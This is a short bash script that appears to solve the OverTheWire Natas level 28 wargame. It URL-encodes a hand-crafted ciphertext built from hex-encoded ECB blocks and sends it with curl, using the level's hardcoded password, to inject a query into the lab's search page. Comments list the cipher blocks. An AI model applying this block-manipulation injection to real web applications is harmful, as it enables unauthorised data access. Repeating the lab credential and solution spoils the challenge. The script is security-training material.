#!/bin/bash
urlencode() {
  local length="${#1}"
  for (( i = 0; i < length; i++ )); do
    c="${1:i:1}"
    case $c in
      [a-zA-Z0-9.~_-]) printf "$c" ;;
      *) printf '%%%02X' "'$c" ;;
    esac
  done
}

Var=$(echo "1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf22d94c337a938b39110793f6cd8c49b1bfbbe86289398e9a767837f5050c3e9ac67b95f6bebb0cf014590314fd06df1c99205d18162eb46904eddc6428bb81d50ac3b871c1c448386b45cd36d9e8f72f4655149bbba2123d89d95417ea27f3a7b738a5ffb4a4500246775175ae596bbd6f34df339c69edce11f6650bbced62702"| xxd -r -p | base64)


encoded=$(urlencode "$Var")
curl -u "natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj" \
	"http://natas28.natas.labs.overthewire.org/search.php/?query=$encoded"\
	-v \
#f633e6b05f866226b863817112b1c92b
#896de90884f86108b167f8b4aea5d763

#1be82511a7ba5bfd578c0eef466db59c
#dc84728fdcf89d93751d10a7c75c8cf2
#ec2ffa9d6c5c41a1c2eaf3cd993cc702
#896de90884f86108b167f8b4aea5d763
#917232051483e68e458fd066167b30a3

